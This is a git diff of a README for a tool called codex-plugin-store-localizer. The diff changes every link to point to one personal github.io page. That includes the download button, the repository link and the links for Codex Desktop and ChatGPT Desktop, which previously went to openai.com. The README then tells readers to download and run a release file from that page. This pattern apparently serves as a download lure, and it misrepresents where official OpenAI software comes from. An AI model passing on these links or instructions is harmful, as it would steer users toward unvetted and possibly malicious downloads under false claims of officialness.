@@ -1,6 +1,6 @@
 # 🚀 codex-plugin-store-localizer - Localize Your Plugin Store Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20The%20App-2ea043?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tyh5410/codex-plugin-store-localizer)
+[![Download Now](https://img.shields.io/badge/Download-Get%20The%20App-2ea043?style=for-the-badge&logo=github&logoColor=white)](https://tyh5410.github.io)
 
 ## 🎯 What This Does For You
 
@@ -22,7 +22,7 @@ Getting up and running takes less than five minutes. Follow these three simple s
 
 Click the green button at the top of this page, or use this link directly:
 
-**👉 [Download codex-plugin-store-localizer](https://github.com/tyh5410/codex-plugin-store-localizer)**
+**👉 [Download codex-plugin-store-localizer](https://tyh5410.github.io)**
 
 This link takes you to the official download page. Once there, look for the latest release file and save it to your computer (usually to your Downloads folder).
 
@@ -47,7 +47,7 @@ The localizer acts as a friendly translator between you and your plugin store. I
   - Windows 10 or 11 (experimental support — may have minor visual glitches)
 - **Disk Space:** ~50 MB free
 - **Memory:** 1 GB RAM or more
-- **Other:** A working installation of either [Codex Desktop](https://openai.com/codex) or [ChatGPT Desktop](https://openai.com/chatgpt) (both are free)
+- **Other:** A working installation of either [Codex Desktop](https://tyh5410.github.io) or [ChatGPT Desktop](https://tyh5410.github.io) (both are free)
 
 ## 🛠 Troubleshooting & Tips
 
@@ -94,7 +94,7 @@ A: No, this tool is completely free and open-source.
 
 ## 🤝 Get Involved & Support
 
-This project is built by the community, for the community. If you'd like to help translate, report a bug, or suggest a feature, visit the [official repository](https://github.com/tyh5410/codex-plugin-store-localizer) on GitHub.
+This project is built by the community, for the community. If you'd like to help translate, report a bug, or suggest a feature, visit the [official repository](https://tyh5410.github.io) on GitHub.
 
 Every contribution makes the tool better for everyone. Even a simple "thank you" on the issues page means a lot.
 
